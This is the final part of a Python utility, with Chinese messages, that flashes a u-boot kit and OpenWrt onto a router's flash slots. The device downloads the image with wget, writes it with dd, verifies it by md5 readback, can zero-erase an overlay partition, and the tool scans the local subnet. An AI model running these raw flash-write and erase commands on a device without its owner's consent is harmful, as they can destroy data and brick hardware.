        info("   --dry-run：未写入任何东西")
        return 0
    if not _confirm(args, "确认写入 A 槽？"):
        return 0
    if not do_flash(tn, plan, pc_ip, pkg_name):
        info("")
        info("!! 回读不一致，不要重启。原厂主槽未受影响。")
        return 5
    info("")
    info("[9] 全部校验通过")
    info("")
    info("[10] 重启")
    tn.sh("reboot", 3.0)
    info("   预期启动链：")
    info("     一级 u-boot(boot_flag=1) → 验 B 槽通过 → 载入 B 槽 u-boot(我们的 kit)")
    info("     → kit 先试 A 槽 → bootm 0x4880000 → OpenWrt")
    info("   约 40 秒后 ssh root@192.168.1.1")
    return 0


# ---------------------------------------------------------------------------
# 刷 u-boot kit
# ---------------------------------------------------------------------------

UBOOT_SLOT_LEN = 0x40000

# u-boot 槽位（两个都写，与 kit 的 tpluboot 行为一致）
UBOOT_SLOTS = [
    (4, "normal_boot"),    # 0x4700000  A 槽 u-boot（我们 boot 的就是它）
    (9, "normal_boot_bak"),  # 0x700000  B 槽 u-boot（一级 u-boot 优先载入）
]


def flash_uboot(tn, args, fw, mtd_table, pc_ip, pkg_name):
    info("")
    info("[5] u-boot kit 刷写计划")
    info("   镜像: %s (0x%x)" % (pkg_name, UBOOT_SLOT_LEN))
    info("")
    info("   目标槽（两个都写，与 kit 的 tpluboot 一致）:")
    for idx, nm in UBOOT_SLOTS:
        if idx in mtd_table:
            info("     mtd%-2d %-18s 0x%08x" % (idx, mtd_table[idx][1], mtd_table[idx][0]))
        else:
            info("     mtd%-2d %-18s (不存在)" % (idx, nm))
    info("")
    info("   !! u-boot 是 TTL 命脉。写错 = 只能拆机接串口。")
    info("      本工具不会动 mtd0（一级 u-boot），只写二级。")

    if args.dry_run:
        info("")
        info("   --dry-run：未写入任何东西")
        return 0
    if not _confirm(args, "确认写入 u-boot 两个槽？"):
        return 0

    url = "http://%s:%d/%s" % (pc_ip, SRV_PORT, pkg_name)
    info("")
    info("[6] 设备侧下载")
    out = tn.sh("cd /tmp && wget -O ub.bin '%s' 2>&1 | tail -2" % url, 12.0)
    info("   " + out.strip()[:240])
    info("")
    info("[7] 写入")
    ok = True
    for idx, nm in UBOOT_SLOTS:
        if idx not in mtd_table:
            continue
        out = tn.sh("dd if=/tmp/ub.bin of=/dev/mtdblock%d bs=%d count=1 2>&1"
                    % (idx, UBOOT_SLOT_LEN), 20.0)
        info("   mtd%-2d %-18s %s" % (idx, nm, out.strip().splitlines()[-1][:90] if out.strip() else ""))
    tn.sh("sync", 3.0)

    info("")
    info("[8] 回读校验")
    got = _first_md5(tn.sh("dd if=/tmp/ub.bin bs=%d count=1 2>/dev/null | md5sum"
                        % UBOOT_SLOT_LEN, 12.0))
    want = _first_md5(tn.sh("dd if=/dev/mtdblock%d bs=%d count=1 2>/dev/null | md5sum"
                         % (UBOOT_SLOTS[0][0], UBOOT_SLOT_LEN), 12.0))
    info("   源   %s" % got)
    info("   mtd%d %s" % (UBOOT_SLOTS[0][0], want))
    if got != want:
        info("   !! 不一致")
        ok = False

    if ok:
        info("")
        info("[9] u-boot 写入校验通过，不重启（当前系统继续用原 u-boot 直到下次开机）")
        return 0
    return 5


def _do_reset_overlay(tn, args, fw, mtd_table):
    o = OVERLAYS[args.reset_overlay]
    info("")
    info("[5b] 额外擦除 %s 的 overlay：%s  0x%07x 长 0x%x"
         % (args.reset_overlay, o["name"], o["start"], o["len"]))
    if o["mtd"] not in mtd_table:
        info("     ! mtd%d 不存在，跳过" % o["mtd"])
        return
    if args.dry_run:
        info("     --dry-run：未擦")
        return
    out = tn.sh("dd if=/dev/zero of=/dev/mtdblock%d bs=%d count=%d 2>&1 | tail -1"
                % (o["mtd"], DD_BS, o["len"] // DD_BS), 30.0)
    info("     " + out.strip()[:200])


def _confirm(args, prompt):
    if getattr(args, "yes", False):
        return True
    try:
        ans = input("\n   %s [y/N] " % prompt).strip().lower()
    except (EOFError, KeyboardInterrupt):
        return False
    return ans in ("y", "yes", "是")


def scan_target(timeout=0.35):
    found = []
    lock = threading.Lock()

    def probe(i):
        ip = "192.168.1.%d" % i
        for port in (80, 443):
            s = socket.socket()
            s.settimeout(timeout)
            rc = s.connect_ex((ip, port))
            s.close()
            if rc == 0:
                with lock:
                    found.append((ip, port))
                return

    ts = [threading.Thread(target=probe, args=(i,)) for i in range(1, 255)]
    for t in ts:
        t.start()
    for t in ts:
        t.join()
    if not found:
        return None
    for ip, port in sorted(found):
        info("   候选 %s:%d" % (ip, port))
    return sorted(found)[0][0]


def detect_pc_ip(target):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target, 80))
        return s.getsockname()[0]
    except Exception:
        return None
    finally:
        s.close()


if __name__ == "__main__":
    sys.exit(main())
